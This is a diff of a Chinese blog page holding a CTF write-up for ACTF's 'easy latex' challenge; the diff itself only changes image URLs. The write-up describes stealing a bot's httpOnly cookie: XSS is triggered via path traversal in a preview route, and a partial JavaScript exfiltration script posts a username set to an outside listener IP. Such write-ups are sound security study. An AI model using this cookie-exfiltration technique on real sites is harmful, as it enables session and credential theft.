@@ -86,9 +86,9 @@
             <p>周末看了下ACTF的题目，在这里做个记录</p>
 <h2 id="easy-latex">easy latex</h2>
 <p>题目起手先在bot里面看到了flag</p>
-<p><img src="https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202310312110694.png" alt="image-20231031211020499"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202310312110694.png" alt="image-20231031211020499"></p>
 <p>可是被设置为了<code>httpOnly</code>，也就是我们不可能使用xss去获得flag，查看其应用路由。在vip中发现</p>
-<p><img src="https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202310312111359.png" alt="image-20231031211130263"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202310312111359.png" alt="image-20231031211130263"></p>
 <p>它获取了请求中的cookie，将其重新拼装后发送请求，也就是我们的bot只要向vip 路由发送post请求就能拿其Cookie，但是我们需要外带的话，需要控制其username为我们监听的地址或者webhook。最后就是找个地方能触发JS脚本执行的地方，外带脚本如下</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:3000/login&#34;</span>;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">requestBody</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;username=http%3A%2F%2F49.232.214.202%3A5000%2F&amp;password=add29f48a5ae410bd6e875c8cd1ab8b7&#34;</span>;
@@ -129,7 +129,7 @@
 </span></span><span style="display:flex;"><span>};
 </span></span></code></pre></div><p>路由内可以造成XSS就两个点，一个preview一个note，但是note需要登录，看了下逻辑不太可能去绕过VIP，然后试了下在puppeteer中是可以使用<code>../</code>去逃逸出固定的路由的，所以可以使用<code>preview</code>去触发XSS这个点</p>
 <p>在<code>preview</code>路由中</p>
-<p><img src="https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202310312116991.png" alt="image-20231031211606922"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202310312116991.png" alt="image-20231031211606922"></p>
 <p>我们的<code>theme</code>可控，然后渲染页面后会去加载<code>/js/base.js</code>，所以我们只要将上面的脚本放在服务器上，让其加载就能造成<code>XSS</code></p>
 <h2 id="story">story</h2>
 <p>看了下代码第一眼：致敬Jumpserver哈哈哈哈</p>
